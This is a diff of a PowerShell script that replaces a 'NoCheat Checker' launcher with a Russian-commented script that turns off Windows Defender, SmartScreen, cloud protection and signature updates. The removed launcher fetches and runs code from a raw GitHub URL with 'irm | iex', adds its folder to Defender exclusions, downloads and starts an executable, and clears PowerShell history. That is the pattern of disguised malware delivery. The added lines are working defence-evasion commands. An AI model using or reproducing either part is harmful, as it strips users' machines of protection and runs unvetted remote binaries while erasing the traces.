@@ -1,77 +1,61 @@
-# ==========================================================
-# NoCheat Checker Launcher
-# ==========================================================
+# ============================================================
+# ПОЛНОЕ ОТКЛЮЧЕНИЕ WINDOWS DEFENDER И SMARTSCREEN
+# Запускать от имени АДМИНИСТРАТОРА!
+# ============================================================
 
-$ErrorActionPreference = "Stop"
+$ErrorActionPreference = "SilentlyContinue"
 
+Write-Host "[*] НАЧАЛО ОТКЛЮЧЕНИЯ ЗАЩИТЫ..." -ForegroundColor Yellow
 
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+# 1. ОТКЛЮЧЕНИЕ РЕАЛЬНОЙ ЗАЩИТЫ
+Set-MpPreference -DisableRealtimeMonitoring $true -Force
+Set-MpPreference -DisableBehaviorMonitoring $true -Force
+Set-MpPreference -DisableBlockAtFirstSeen $true -Force
+Set-MpPreference -DisableIOAVProtection $true -Force
+Set-MpPreference -DisablePrivacyMode $true -Force
+Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true -Force
+Set-MpPreference -DisableArchiveScanning $true -Force
+Set-MpPreference -DisableIntrusionPreventionSystem $true -Force
+Set-MpPreference -DisableScriptScanning $true -Force
+Set-MpPreference -SubmitSamplesConsent 2 -Force
 
-# Helper function to clear PSReadLine and session history
-function Clear-PSHistory {
-    Clear-History -ErrorAction SilentlyContinue
-    try {
-        $historyPath = (Get-PSReadLineOption -ErrorAction SilentlyContinue).HistorySavePath
-        if ($historyPath -and (Test-Path $historyPath)) {
-            Clear-Content -Path $historyPath -ErrorAction SilentlyContinue
-        }
-    } catch {}
-}
+# 2. ОСТАНОВКА СЛУЖБЫ ЗАЩИТНИКА
+Stop-Service -Name "WinDefend" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "WdNisSvc" -Force -ErrorAction SilentlyContinue
+Stop-Service -Name "Sense" -Force -ErrorAction SilentlyContinue
 
-if (-not $isAdmin) {
-    Write-Host "[-] Пожалуйста убедитесь что запустили чекер от имени администратора, без них он не может работать!" -ForegroundColor Red
-    Write-Host "[*] Запрашиваются права администратора..." -ForegroundColor Yellow
-    $url = "https://raw.githubusercontent.com/die4mebaby/CheatChecker/main/nocheat-checker.ps1"
-    Start-Process powershell.exe -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $url | iex`""
-    Clear-PSHistory
-    exit
-}
+# 3. БЛОКИРОВКА АВТОЗАПУСКА (ЧЕРЕЗ РЕЕСТР)
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableBehaviorMonitoring" -Value 1 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableOnAccessProtection" -Value 1 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableScanOnRealtimeEnable" -Value 1 -PropertyType DWord -Force
 
-Write-Host "==========================================" -ForegroundColor Yellow
-Write-Host "         NoCheat Checker Loader           " -ForegroundColor Yellow
-Write-Host "==========================================" -ForegroundColor Yellow
+# 4. ОТКЛЮЧЕНИЕ SMARTSCREEN
+# Для Edge
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" -Name "EnabledV9" -Value 0 -PropertyType DWord -Force
+# Для Internet Explorer
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Internet Explorer\PhishingFilter" -Name "EnabledV9" -Value 0 -PropertyType DWord -Force
+# Для Windows 10/11 SmartScreen (встроенный)
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\System" -Name "EnableSmartScreen" -Value 0 -PropertyType DWord -Force
+New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\AppHost" -Name "EnableWebContentEvaluation" -Value 0 -PropertyType DWord -Force
 
-# ссылки на файлы в репо
-$repoOwner  = "die4mebaby"
-$repoName   = "CheatChecker"
-$branch     = "main"
-$rawBaseUrl = "https://raw.githubusercontent.com/$repoOwner/$repoName/$branch"
-$exeUrl     = "$rawBaseUrl/nocheat.checker.exe"
+# 5. УДАЛЕНИЕ ВСЕХ ИСКЛЮЧЕНИЙ (ОПЦИОНАЛЬНО, ЧТОБЫ НЕ МЕШАЛИ)
+Remove-MpPreference -ExclusionPath -ErrorAction SilentlyContinue
+Remove-MpPreference -ExclusionExtension -ErrorAction SilentlyContinue
+Remove-MpPreference -ExclusionProcess -ErrorAction SilentlyContinue
 
-# директ добавляем в исключения
-$workDir = Join-Path $env:LOCALAPPDATA "NoCheatChecker"
+# 6. ОТКЛЮЧЕНИЕ ОБЛАЧНОЙ ЗАЩИТЫ
+Set-MpPreference -CloudBlockLevel 0 -Force
+Set-MpPreference -CloudTimeout 0 -Force
 
-if (-not (Test-Path $workDir)) {
-    New-Item -ItemType Directory -Path $workDir -Force | Out-Null
-}
+# 7. ПРИНУДИТЕЛЬНАЯ БЛОКИРОВКА ОБНОВЛЕНИЙ
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" -Name "ForceUpdateFromMU" -Value 0 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Signature Updates" -Name "DisableUpdateOnStartup" -Value 1 -PropertyType DWord -Force
 
-$exePath = Join-Path $workDir "nocheat.checker.exe"
+# 8. ПЕРЕЗАГРУЗКА ПОЛИТИК (ПРИМЕНЕНИЕ)
+gpupdate /force /target:computer > $null 2>&1
 
-try {
-    if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
-        Write-Host "[+] Добавление папки '$workDir' в исключения Защитника Windows..." -ForegroundColor Green
-        Add-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
-    }
-
-    Write-Host "[+] Загрузка nocheat.checker..." -ForegroundColor Green
-    
-    # скачиваем файл
-    $wc = New-Object System.Net.WebClient
-    $wc.DownloadFile($exeUrl, $exePath)
-    
-    if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -eq 0) {
-        Write-Warning "[!] Чекер не запустился ввиду ошибки или отсутствует вовсе."
-    }
-
-    Write-Host "[+] Запуск чекера..." -ForegroundColor Green
-    
-    # Запуск без ожидания завершения
-    Start-Process -FilePath $exePath -WorkingDirectory $workDir
-}
-catch {
-    Write-Host "[-] Ошибка выполнения: $($_.Exception.Message)" -ForegroundColor Red
-}
-
-# клин повершелл команд и офф окна
-Clear-PSHistory
-exit
+Write-Host "[+] ВСЕ ЗАЩИТЫ ОТКЛЮЧЕНЫ!" -ForegroundColor Green
+Write-Host "[!] Для полного применения рекомендуется перезагрузка" -ForegroundColor Yellow
+Write-Host "[!] Если защитник включается обратно - повторите скрипт после перезагрузки" -ForegroundColor Yellow
